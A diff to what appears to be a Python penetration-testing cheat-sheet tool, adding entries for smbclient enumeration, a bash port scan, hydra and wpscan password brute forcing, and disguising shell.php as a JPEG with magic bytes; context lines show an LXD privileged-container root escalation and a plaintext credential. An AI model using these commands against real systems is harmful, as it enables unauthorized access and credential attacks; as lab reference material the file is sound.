@@ -278,7 +278,7 @@ crackmapexec winrm 10.10.10.193 -u 'svc-print' -p '$fab@s3Rv1ce$1'
 ######################################
 ######################################
 
-cewl = Cheat("Cewl - Html to Password list")
+cewl = Cheat("cewl - Html to Password list")
 cewl.category = "Tools"
 cewl.output = """[*] Simple tool to take all word of a html page and create a file
 
@@ -372,4 +372,132 @@ lxc init javali javali-container -c security.privileged=true
 lxc config device add javali-container mydevice disk source=/ path=/mnt/root recursive=true
 lxc start javali-container
 lxc exec javali-container /bin/sh
+"""
+
+######################################
+######################################
+
+smbclient = Cheat("smbclient - Basics - TCP 445")
+smbclient.category = "Tools"
+smbclient.output = """[*] smbclient - ftp-like client to access SMB/CIFS resources on servers
+
+smbclient -L \\\\\\\\10.10.10.10\\\\                       # Enumera as pastas não ocultas em modo anonymous
+smbclient -p 1234 \\\\\\\\10.10.10.10\\\\                  # Especifica uma porta diferente da normal (445)
+smbclient \\\\\\\\10.10.10.10\\\\directory                 # Tenta entrar para a pasta "directory" do share SMB
+smbclient -k \\\\\\\\10.10.10.10\\\\                       # Kerberos mode
+smbclient -U USERNAME -N \\\\\\\\10.10.10.10\\\\           # Tenta entrar com username sem password
+smbclient -U USERNAME -P PASSWORD \\\\\\\\10.10.10.10\\\\
+smbclient -W WORKGROUP \\\\\\\\10.10.10.10\\\\
+"""
+
+######################################
+######################################
+
+manualTcpScanInBash = Cheat("Manual TCP Scan in Bash")
+manualTcpScanInBash.category = "Tools"
+manualTcpScanInBash.output = """[*] Manually scan ports in bash when no nmap or similar
+
+for port in $(seq 1 65355); do
+	timeout 1 bash -c "echo > /dev/tcp/10.10.10.123/$port" && echo "[*] Open Port => $port" &
+done; wait
+"""
+
+######################################
+######################################
+
+hydraBasics = Cheat("hydra - Login BruteForce")
+hydraBasics.category = "Tools"
+hydraBasics.output = """[*] A very fast network logon cracker which supports many different services
+
+# PRINCIPAL OPTIONS:
+# 	-s PORT
+# 	-l LOGIN_NAME -L LIST_LOGIN_NAMES
+# 	-p PASSWORD -P LIST_PASSWORDS
+# 	-C FILE (colon separated "login:pass" format, instead of -L/-P options)
+# 	-o FILE (write found login/password pairs to FILE instead of stdout)
+# 	-t TASKS (run TASKS number of connects in parallel (default: 16))
+# 	-m OPTIONS (module specific options. See hydra -U <module> what  options  are  available.)
+# 	-v / -V (verbose mode / show login+pass combination for each attempt)
+# 	-f (exit after get first login:password)
+
+export user=Admin
+export pass=PaSsW0rD!
+export ip=10.10.10.10
+
+hydra -l $user -P ./passwords.txt ftp://$ip -vV -f           # FTP brute force
+hydra -l $user -P ./passwords.txt $ip -t 4 ssh -vV -f        # SSH brute force
+hydra -P ./passwords.txt -v $ip snmp -vV -f                  # SNMP brute force
+hydra -l $user -P ./passwords.txt -f $ip pop3 -vV -f         # POP3 Brute Force
+hydra -P /usr/share/wordlistsnmap.lst $ip smtp -vV -f        # SMTP Brute Force
+hydra -t 1 -l $user -P ./passwords.txt $ip smb -vV -f        # SMB Brute Forcing
+hydra -L users.txt -P passwords.txt $ip smb -vV -f           # SMB Brute Forcing
+hydra -t 1 -l $user -P ./passwords.txt rdp://$ip -vV -f      # Hydra attack Windows Remote Desktop
+hydra -L users.txt -P passwords.txt $ip ldap2 -vV -f	     # LDAP Brute Forcing
+hydra -L ./users.txt -P ./passwords.txt $ip http-get /admin  # attack http get 401 login with a dictionary
+
+# Post Web Form
+hydra -l $user -P ./passwordlist.txt $ip http-post-form "/:username=^USER^&password=^PASS^:F=incorrect"
+hydra -l $user -P ./passwordlist.txt $ip -V http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
+
+# Get form popup login
+hydra -l $user -P ./passwordlist.txt $ip http-get /dir/
+"""
+
+######################################
+######################################
+
+wgetRecursive = Cheat("wget Recursive")
+wgetRecursive.category = "Tools"
+wgetRecursive.output = """[*] Download recursively all file from simple server via url
+
+# -np (no-parent) -R "string" (remove files with string name... wilcards works)
+wget -r http://10.10.10.75/nibbleblog/content/ -np -R "index.html*" 
+"""
+
+######################################
+######################################
+
+wpscan = Cheat("wpscan - wordpress")
+wpscan.category = "Tools"
+wpscan.output = """[*] WPScan - WordPress Security Scanner
+
+wpscan --url www.website.com              # Non-intrusive scan
+	-t 50                                 # Force 50 threads
+	--cookie-string COOKIE                # Cookie string to use in requests, format: cookie1=value1[; cookie2=value2]
+	--wp-content-dir /DIR                 # Specific correct /path when is not the default
+	--wp-plugins-dir /DIR                 # Specific correct /path when is not the default
+	--enumerate [OPTIONS]                 # Valid options: vp (Vulnerable plugins),
+										  #                ap (All plugins),
+										  #                p (Plugins),
+										  #                vt (Vulnerable themes),
+										  #                at (All themes),
+										  #                t (Themes),
+										  #                tt (Timthumbs),
+										  #                cb (Config backups),
+										  #                u (User IDs)
+										  # Format: [choice],[choice],[choice],...
+	-P, --passwords /path/wordlist.txt    # List of password to brute force. If no --usernames, user enumeration will be run
+	-U, --usernames /path/wordlist.txt    # List of usernames to brute force. Examples: 'a1', 'a1,a2,a3', '/tmp/a.txt'
+	--update                              # Update database
+
+# Examples:
+wpscan --url www.website.com
+wpscan --url www.website.com --passwords /path/wordlist.txt -t 50
+wpscan --url www.website.com --passwords /path/wordlist.txt --usernames admin
+wpscan --url www.website.com --passwords /path/wordlist.txt --usernames admin --wp-content-dir custom-content
+wpscan --url www.website.com --passwords /path/wordlist.txt --usernames admin --wp-plugins-dir wp-content/custom-plugins
+"""
+
+######################################
+######################################
+
+mimeChanger = Cheat("Change MIME Type of file")
+mimeChanger.category = "Tools"
+mimeChanger.output = """[*] Change MIME Type of file...
+
+# https://en.wikipedia.org/wiki/List_of_file_signatures
+# This methode will overwrite first bytes...
+
+xxd -r -p -o 0 <(echo FF D8 FF DB) shell.php.jpg
+
 """
